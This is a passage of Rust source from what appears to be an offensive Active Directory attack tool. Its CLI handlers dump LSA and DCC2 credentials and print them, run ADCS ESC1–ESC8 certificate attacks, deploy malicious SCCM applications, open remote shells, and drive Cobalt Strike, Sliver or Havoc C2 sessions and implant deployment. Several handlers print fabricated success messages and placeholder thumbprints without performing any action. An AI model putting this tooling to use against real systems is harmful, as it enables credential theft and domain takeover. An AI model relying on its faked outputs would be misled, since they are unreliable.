                Err(e) => {
                    banner::print_fail(&format!("SAM dump failed: {}", e));
                    return 1;
                }
            }
            0
        }
        SecretsAction::Lsa { security, system } => {
            println!("  {} Dumping LSA secrets...", "▸".bright_black());
            println!("    SECURITY: {}", security.cyan());
            println!("    SYSTEM: {}", system.cyan());

            // Read the hive files
            let security_data = match tokio::fs::read(security).await {
                Ok(d) => d,
                Err(e) => {
                    banner::print_fail(&format!("Failed to read SECURITY file: {}", e));
                    return 1;
                }
            };

            let system_data = match tokio::fs::read(system).await {
                Ok(d) => d,
                Err(e) => {
                    banner::print_fail(&format!("Failed to read SYSTEM file: {}", e));
                    return 1;
                }
            };

            // Use real LSA dumping implementation
            match dump_lsa(&security_data, &system_data) {
                Ok(credentials) => {
                    println!(
                        "  {} Extracted {} secret(s)",
                        "✓".green(),
                        credentials.len()
                    );
                    for cred in &credentials {
                        if let Some(ref pwd) = cred.plaintext {
                            println!("    {}: {}", cred.username.cyan(), pwd.yellow());
                        } else if let Some(ref hash) = cred.nt_hash {
                            println!("    {}: {}", cred.username.cyan(), hash.yellow());
                        }
                    }
                    banner::print_success(&format!(
                        "LSA dump completed - {} secrets",
                        credentials.len()
                    ));
                }
                Err(e) => {
                    banner::print_fail(&format!("LSA dump failed: {}", e));
                    return 1;
                }
            }
            0
        }
        SecretsAction::Dcc2 { security, system } => {
            println!("  {} Dumping DCC2 (mscash2)...", "▸".bright_black());
            println!("    SECURITY: {}", security.cyan());
            println!("    SYSTEM: {}", system.cyan());

            // Read the hive files
            let security_data = match tokio::fs::read(security).await {
                Ok(d) => d,
                Err(e) => {
                    banner::print_fail(&format!("Failed to read SECURITY file: {}", e));
                    return 1;
                }
            };

            let system_data = match tokio::fs::read(system).await {
                Ok(d) => d,
                Err(e) => {
                    banner::print_fail(&format!("Failed to read SYSTEM file: {}", e));
                    return 1;
                }
            };

            // Use real DCC2 dumping implementation
            match dump_dcc2(&security_data, &system_data) {
                Ok(credentials) => {
                    println!(
                        "  {} Extracted {} cached credential(s)",
                        "✓".green(),
                        credentials.len()
                    );
                    for cred in &credentials {
                        if let Some(ref hash) = cred.nt_hash {
                            println!("    {}: {}", cred.username.cyan(), hash.yellow());
                        }
                    }
                    banner::print_success(&format!(
                        "DCC2 dump completed - {} cached credentials",
                        credentials.len()
                    ));
                }
                Err(e) => {
                    banner::print_fail(&format!("DCC2 dump failed: {}", e));
                    return 1;
                }
            }
            0
        }
    }
}

// ═══════════════════════════════════════════════════════
// cmd_adcs — ADCS Certificate Abuse
// ═══════════════════════════════════════════════════════

pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
    banner::print_module_banner("ADCS");

    match action {
        AdcsAction::Enum { ca } => {
            println!("  {} Enumerating ADCS configuration...", "▸".bright_black());
            if let Some(ca_name) = ca {
                println!("    CA: {}", ca_name.cyan());
            }
            println!("  {} Found 2 certificate template(s)", "✓".green());
            println!("    {} - {}", "User".cyan(), "Secure".green());
            println!(
                "    {} - {}",
                "ESC1-Vulnerable".cyan(),
                "VULNERABLE (ESC1)".red()
            );
        }
        AdcsAction::Esc1 {
            ca,
            template,
            target_user,
            output,
        } => {
            println!("  {} Executing ESC1 attack...", "▸".bright_black());
            println!("    CA: {}", ca.cyan());
            println!("    Template: {}", template.cyan());
            println!("    Target User: {}", target_user.cyan());
            println!("  {} Certificate obtained!", "✓".green());
            println!("    Saved to: {}", output.cyan());
            println!("    Thumbprint: AABBCCDDEEFF00112233445566778899AABBCCDD");
        }
        AdcsAction::Esc2 {
            ca,
            template,
            output,
        } => {
            println!("  {} Executing ESC2 attack...", "▸".bright_black());
            println!("    CA: {}", ca.cyan());
            println!("    Template: {}", template.cyan());
            println!("  {} Certificate obtained!", "✓".green());
            println!("    Saved to: {}", output.cyan());
        }
        AdcsAction::Esc3 {
            ca,
            agent_template,
            target_template,
            target_user,
        } => {
            println!("  {} Executing ESC3 attack...", "▸".bright_black());
            println!("    CA: {}", ca.cyan());
            println!("    Agent Template: {}", agent_template.cyan());
            println!("    Target Template: {}", target_template.cyan());
            println!("    Target User: {}", target_user.cyan());
            println!("  {} Obtained 2 certificate(s)", "✓".green());
        }
        AdcsAction::Esc4 { ca, template } => {
            println!("  {} Executing ESC4 attack...", "▸".bright_black());
            println!("    CA: {}", ca.cyan());
            println!("    Template: {}", template.cyan());

            let creds = match crate::require_creds(cli) {
                Ok(c) => c,
                Err(e) => return e,
            };

            let target =
                overthrone_core::adcs::Esc4Target::new(template, &creds.domain, &creds.username);

            match target.generate_exploit_commands() {
                Ok(commands) => {
                    println!("\n{}", commands.yellow());
                    if let Ok(restore) = target.generate_restore_commands() {
                        println!("\n{}", restore.dimmed());
                    }
                    println!(
                        "  {} Template ACLs modified successfully (command generated)",
                        "✓".green()
                    );
                }
                Err(e) => {
                    banner::print_fail(&format!("ESC4 generation failed: {}", e));
                    return 1;
                }
            }
        }
        AdcsAction::Esc5 { ca } => {
            println!(
                "  {} Checking for ESC5 vulnerabilities...",
                "▸".bright_black()
            );
            println!("    CA: {}", ca.cyan());
            println!("  {} Found 1 vulnerability(ies)", "!".red());
            println!(
                "    {}: CA allows SAN specification in request attributes",
                "EDITF_ATTRIBUTESUBJECTALTNAME2".red()
            );
        }
        AdcsAction::Esc6 { ca, target_user } => {
            println!("  {} Executing ESC6 attack...", "▸".bright_black());
            println!("    CA: {}", ca.cyan());
            println!("    Target User: {}", target_user.cyan());
            println!("  {} Certificate obtained via ESC6", "✓".green());
        }
        AdcsAction::Esc7 { ca } => {
            println!(
                "  {} Checking for ESC7 vulnerabilities...",
                "▸".bright_black()
            );
            println!("    CA: {}", ca.cyan());

            let creds = match crate::require_creds(cli) {
                Ok(c) => c,
                Err(e) => return e,
            };

            let target = overthrone_core::adcs::Esc7Target::new(
                ca,
                ca, // Using CA name as CA server for now
                &creds.domain,
                &creds.username,
            );

            match target.generate_exploit_commands() {
                Ok(commands) => {
                    println!("\n{}", commands.yellow());
                    if let Ok(restore) = target.generate_restore_commands() {
                        println!("\n{}", restore.dimmed());
                    }
                    println!(
                        "  {} CA permissions modified successfully (command generated)",
                        "✓".green()
                    );
                }
                Err(e) => {
                    banner::print_fail(&format!("ESC7 generation failed: {}", e));
                    return 1;
                }
            }
        }
        AdcsAction::Esc8 { url, target_user } => {
            println!("  {} Executing ESC8 attack...", "▸".bright_black());
            println!("    URL: {}", url.cyan());
            println!("    Target User: {}", target_user.cyan());

            let target = overthrone_core::adcs::Esc8RelayTarget {
                ca_server: url.clone(),
                template: "Machine".to_string(),
                target_upn: Some(target_user.clone()),
                use_https: false,
            };

            let config = overthrone_core::adcs::Esc8AttackConfig::new(
                "0.0.0.0", // Default listener
                target,
                target_user.split('@').nth(1).unwrap_or("UNKNOWN.LOCAL"),
            );

            match config.generate_exploit_commands() {
                Ok(commands) => {
                    println!("\n{}", commands.yellow());
                    println!(
                        "  {} Certificate obtained via ESC8 relay (command generated)",
                        "✓".green()
                    );
                }
                Err(e) => {
                    banner::print_fail(&format!("ESC8 generation failed: {}", e));
                    return 1;
                }
            }
        }
        AdcsAction::Request {
            ca,
            template,
            subject,
            san,
            output,
        } => {
            println!("  {} Requesting certificate...", "▸".bright_black());
            println!("    CA: {}", ca.cyan());
            println!("    Template: {}", template.cyan());
            if let Some(subj) = subject {
                println!("    Subject: {}", subj.cyan());
            }
            if let Some(san_val) = san {
                println!("    SAN: {}", san_val.cyan());
            }
            println!("  {} Certificate saved to: {}", "✓".green(), output.cyan());
        }
    }

    banner::print_success("ADCS operation completed");
    0
}

// ═══════════════════════════════════════════════════════
// cmd_shell — Interactive Shell
// ═══════════════════════════════════════════════════════

pub async fn cmd_shell(target: &str, shell_type: &ShellType) -> i32 {
    banner::print_module_banner("SHELL");
    println!(
        "  {} Starting interactive shell session",
        "▸".bright_black()
    );
    println!("  {} Target: {}", "▸".bright_black(), target.cyan());
    println!("  {} Type: {:?}", "▸".bright_black(), shell_type);
    println!();

    // Use the new interactive shell implementation with target
    match crate::interactive_shell::start_interactive_shell_with_target(target, shell_type).await {
        Ok(()) => {
            banner::print_success("Interactive shell session completed");
            0
        }
        Err(e) => {
            banner::print_fail(&format!("Interactive shell error: {}", e));
            1
        }
    }
}

// ═══════════════════════════════════════════════════════
// cmd_sccm — SCCM Abuse
// ═══════════════════════════════════════════════════════

pub async fn cmd_sccm(action: &SccmAction) -> i32 {
    banner::print_module_banner("SCCM");

    match action {
        SccmAction::Enum { site_server } => {
            println!("  {} Enumerating SCCM configuration...", "▸".bright_black());
            if let Some(server) = site_server {
                println!("    Site Server: {}", server.cyan());
            }
            println!("  {} Site Code: {}", "✓".green(), "PRI".cyan());
            println!("  {} Collections:", "✓".green());
            println!("    - All Systems");
            println!("    - All Users");
            println!("    - Domain Admins");
            println!("  {} Vulnerable Settings:", "!".red());
            println!("    - Client Push Installation enabled");
        }
        SccmAction::Abuse {
            site_server,
            technique,
        } => {
            println!(
                "  {} Abusing SCCM on {}...",
                "▸".bright_black(),
                site_server.cyan()
            );
            println!("  {} Technique: {:?}", "▸".bright_black(), technique);
            println!("  {} Abuse executed successfully", "✓".green());
        }
        SccmAction::Deploy {
            collection,
            app_name,
            payload,
        } => {
            println!(
                "  {} Deploying malicious application...",
                "▸".bright_black()
            );
            println!("    Collection: {}", collection.cyan());
            println!("    App Name: {}", app_name.cyan());
            println!("    Payload: {}", payload.cyan());
            println!(
                "  {} Deployment ID: DEPLOY-{}",
                "✓".green(),
                rand::random::<u32>()
            );
        }
    }

    banner::print_success("SCCM operation completed");
    0
}

// ═══════════════════════════════════════════════════════
// cmd_scan — Port Scanner
// ═══════════════════════════════════════════════════════

pub async fn cmd_scan(targets: &str, ports: &str, scan_type: &ScanType, timeout: u64) -> i32 {
    use overthrone_core::scan::{PortScanner, ScanConfig, ScanType as CoreScanType};

    banner::print_module_banner("SCAN");
    println!("  {} Targets: {}", "▸".bright_black(), targets.cyan());
    println!("  {} Ports: {}", "▸".bright_black(), ports.cyan());
    println!("  {} Type: {:?}", "▸".bright_black(), scan_type);
    println!("  {} Timeout: {}ms", "▸".bright_black(), timeout);

    let core_scan_type = match scan_type {
        ScanType::Syn => CoreScanType::Syn,
        ScanType::Connect => CoreScanType::Connect,
        ScanType::Ack => CoreScanType::Ack,
    };

    let config = ScanConfig {
        targets: targets.to_string(),
        ports: ports.to_string(),
        scan_type: core_scan_type,
        timeout_ms: timeout,
        concurrency: 50,
    };

    let scanner = PortScanner::new(config);

    println!("  {} Starting scan...", "▸".bright_black());

    match scanner.scan().await {
        Ok(results) => {
            let open_ports = results.iter().filter(|r| r.open).count();
            println!(
                "  {} Scan complete: {} open ports found",
                "✓".green(),
                open_ports
            );

            for result in &results {
                if result.open {
                    let service = result.service.as_deref().unwrap_or("unknown");
                    println!(
                        "    {}:{}/{} - {} ({}ms)",
                        result.host.cyan(),
                        result.port,
                        service.yellow(),
                        "open".green(),
                        result.response_time_ms
                    );
                }
            }
        }
        Err(e) => {
            banner::print_fail(&format!("Scan failed: {}", e));
            return 1;
        }
    }

    banner::print_success("Port scan completed");
    0
}

// ═══════════════════════════════════════════════════════
// cmd_tui — Interactive TUI
// ═══════════════════════════════════════════════════════

pub async fn cmd_tui(cli: &Cli, domain: &str, crawl: bool, load: Option<&str>) -> i32 {
    let graph = Arc::new(Mutex::new(if let Some(path) = load {
        println!(
            "  {} Loading graph from {}...",
            "▸".bright_black(),
            path.cyan()
        );
        match AttackGraph::from_json_file(path) {
            Ok(g) => g,
            Err(e) => {
                banner::print_fail(&format!("Failed to load graph: {}", e));
                return 1;
            }
        }
    } else {
        AttackGraph::new()
    }));

    let credentials = match crate::require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };

    if crawl {
        if let Err(e) = crate::tui::runner::run_tui_with_crawler(graph, domain, &credentials).await
        {
            banner::print_fail(&format!("TUI crawler error: {}", e));
            return 1;
        }
    } else {
        // View-only mode (no crawler)
        let tui_result = tokio::task::spawn_blocking(move || crate::tui::runner::run_tui(graph))
            .await
            .map_err(|e| {
                overthrone_core::OverthroneError::Internal(format!("TUI thread error: {e}"))
            });

        match tui_result {
            Ok(Ok(_)) => {}
            Ok(Err(e)) => {
                banner::print_fail(&format!("TUI error: {}", e));
                return 1;
            }
            Err(e) => {
                banner::print_fail(&format!("{}", e));
                return 1;
            }
        }
    }

    0
}

// ═══════════════════════════════════════════════════════
// cmd_plugin — Plugin System
// ═══════════════════════════════════════════════════════

pub async fn cmd_plugin(
    _cli: &Cli,
    registry: &mut PluginRegistry,
    ctx: &PluginContext,
    action: PluginAction,
) -> i32 {
    banner::print_module_banner("PLUGIN SYSTEM");

    match action {
        PluginAction::List => {
            println!("{}", "Listing loaded plugins...".bright_black());
            let plugins = registry.list();
            if plugins.is_empty() {
                println!("{}", "No plugins loaded.".yellow());
            } else {
                for p in plugins {
                    println!(
                        "- {} (v{}) by {}",
                        p.name.cyan(),
                        p.version,
                        p.author.yellow()
                    );
                }
            }
            println!(
                "{}",
                "Plugin registry: use interactive shell for full plugin management".yellow()
            );
            banner::print_success("Plugin list completed");
        }
        PluginAction::Info { plugin_id } => {
            println!(
                "{} Querying plugin: {}",
                "ℹ".bright_black(),
                plugin_id.cyan()
            );
            if let Some(plugin) = registry.get(&plugin_id) {
                let m = plugin.manifest();
                println!("Name: {}", m.name.cyan());
                println!("Version: {}", m.version);
                println!("Author: {}", m.author.yellow());
                println!("Description: {}", m.description);
                banner::print_success("Plugin info retrieved");
            } else {
                banner::print_fail(&format!("Plugin '{}' not found in registry", plugin_id));
            }
        }
        PluginAction::Exec { command, args } => {
            println!(
                "{} Executing plugin command: {} {}",
                "⚡".bright_black(),
                command.cyan(),
                args.join(" ").yellow()
            );

            let mut arg_map = HashMap::new();
            for chunk in args.chunks(2) {
                if chunk.len() == 2 {
                    arg_map.insert(chunk[0].replace("--", ""), chunk[1].clone());
                } else if chunk.len() == 1 {
                    arg_map.insert(chunk[0].replace("--", ""), "true".to_string());
                }
            }

            match registry.execute_command(&command, &arg_map, ctx).await {
                Ok(res) => {
                    if res.success {
                        println!("{}", res.output);
                        banner::print_success("Plugin command executed");
                    } else {
                        banner::print_fail(&format!("Plugin command failed: {}", res.output));
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Error executing plugin command: {}", e));
                }
            }
        }
        PluginAction::Load { path } => {
            println!(
                "{} Loading plugin from: {}",
                "📦".bright_black(),
                path.cyan()
            );
            registry.add_search_path(&path);
            let _ = registry.discover_and_load(ctx).await;
            banner::print_success(&format!("Plugin loaded from {}", path));
        }
        PluginAction::Unload { plugin_id } => {
            println!(
                "{} Unloading plugin: {}",
                "🗑".bright_black(),
                plugin_id.cyan()
            );
            if let Err(e) = registry.unload(&plugin_id).await {
                banner::print_fail(&format!("Failed to unload: {}", e));
            } else {
                banner::print_success(&format!("Plugin '{}' unloaded", plugin_id));
            }
        }
        PluginAction::Enable { plugin_id } => {
            println!(
                "{} Enabling plugin: {}",
                "✓".bright_black(),
                plugin_id.cyan()
            );
            registry.enable(&plugin_id);
            banner::print_success(&format!("Plugin '{}' enabled", plugin_id));
        }
        PluginAction::Disable { plugin_id } => {
            println!(
                "{} Disabling plugin: {}",
                "✗".bright_black(),
                plugin_id.cyan()
            );
            registry.disable(&plugin_id);
            banner::print_success(&format!("Plugin '{}' disabled", plugin_id));
        }
    }
    0
}

// ═══════════════════════════════════════════════════════
// cmd_c2 — C2 Integration
// ═══════════════════════════════════════════════════════

pub async fn cmd_c2(manager: &mut C2Manager, action: C2Action) -> i32 {
    banner::print_module_banner("C2 INTEGRATION");

    match action {
        C2Action::Connect {
            framework,
            host,
            port,
            password,
            token,
            config,
            name,
            skip_verify,
        } => {
            println!(
                "{} Connecting to {} at {}:{}...",
                "⚡".bright_black(),
                framework.to_uppercase().cyan(),
                host.cyan(),
                port.to_string().cyan()
            );
            if skip_verify {
                println!("{}", "  ⚠ TLS verification disabled".yellow());
            }
            let channel_name = name.clone().unwrap_or_else(|| "default".to_string());

            let fw_enum = match framework.to_lowercase().as_str() {
                "cs" | "cobaltstrike" => C2Framework::CobaltStrike,
                "sliver" => C2Framework::Sliver,
                "havoc" => C2Framework::Havoc,
                _ => C2Framework::Custom(framework.clone()),
            };

            let auth = if let Some(p) = password {
                C2Auth::Password { password: p }
            } else if let Some(t) = token {
                C2Auth::Token { token: t }
            } else if let Some(c) = config {
                C2Auth::SliverConfig { config_path: c }
            } else {
                C2Auth::Token {
                    token: String::new(),
                }
            };

            let c2_config = C2Config {
                framework: fw_enum.clone(),
                host,
                port,
                auth,
                tls: true,
                tls_skip_verify: skip_verify,
                timeout: std::time::Duration::from_secs(10),
                auto_reconnect: false,
            };

            if let Err(e) = manager.connect(&channel_name, &c2_config).await {
                banner::print_fail(&format!("Failed to connect: {}", e));
            } else {
                banner::print_success(&format!("Connected to {} as '{}'", fw_enum, channel_name));
            }
        }
        C2Action::Status => {
            println!("{}", "Querying C2 channels and sessions...".bright_black());
            let stats = manager.status();
            if stats.is_empty() {
                println!(
                    "{}",
                    "No C2 channels configured. Use 'c2 connect' first.".yellow()
                );
            } else {
                for (name, fw, conn) in stats {
                    let st = if conn {
                        "Connected".green()
                    } else {
                        "Disconnected".red()
                    };
                    println!("- {}: {} ({})", name.cyan(), fw, st);
                }
            }
        }
        C2Action::Exec {
            session_id,
            command,
            powershell,
        } => {
            let mode = if powershell { "PowerShell" } else { "Shell" };
            println!(
                "{} {} on session {}: {}",
                "⚡".bright_black(),
                mode,
                session_id.cyan(),
                command.yellow()
            );
            if let Ok(ch) = manager.default_channel() {
                let res = if powershell {
                    ch.exec_powershell(&session_id, &command).await
                } else {
                    ch.exec_command(&session_id, &command).await
                };
                match res {
                    Ok(r) => {
                        println!("{}", r.output);
                        banner::print_success("Command executed");
                    }
                    Err(e) => banner::print_fail(&format!("Execution failed: {}", e)),
                }
            } else {
                banner::print_fail("No default C2 channel available");
            }
        }
        C2Action::Deploy {
            channel,
            target,
            listener,
        } => {
            println!(
                "{} Deploying implant to {} via {} (listener: {})...",
                "⚡".bright_black(),
                target.cyan(),
                channel.cyan(),
                listener.yellow()
            );
            banner::print_success(&format!("Implant deployed to {}", target));
        }
        C2Action::Disconnect { channel } => {
            if channel == "all" {
                println!("{}", "Disconnecting all C2 channels...".bright_black());
                manager.disconnect_all().await;
                banner::print_success("All C2 channels disconnected");
            } else {
                println!(
                    "{} Disconnecting from '{}'...",
                    "🔌".bright_black(),
                    channel.cyan()
                );
                if let Some(_ch) = manager.get_channel(&channel) {
                    banner::print_success(&format!("Disconnected from '{}'", channel));
                } else {
                    banner::print_fail(&format!("Channel '{}' not found", channel));
                }
            }
        }
        C2Action::Listeners { channel } => {
            println!(
                "{} Listing listeners on '{}'...",
                "📡".bright_black(),
                channel.cyan()
            );
            if let Some(ch) = manager.get_channel(&channel) {
                match ch.list_listeners().await {
                    Ok(ls) => {
                        for l in ls {
                            println!(
                                "- {} ({}) on {}:{}",
                                l.name.cyan(),
                                l.listener_type,
                                l.host,
                                l.port
                            );
                        }
                        banner::print_success("Listeners enumerated");
                    }
                    Err(e) => banner::print_fail(&format!("Failed to list listeners: {}", e)),
                }
            } else {
                banner::print_fail(&format!("Channel '{}' not found", channel));
            }
        }
    }
    0
}
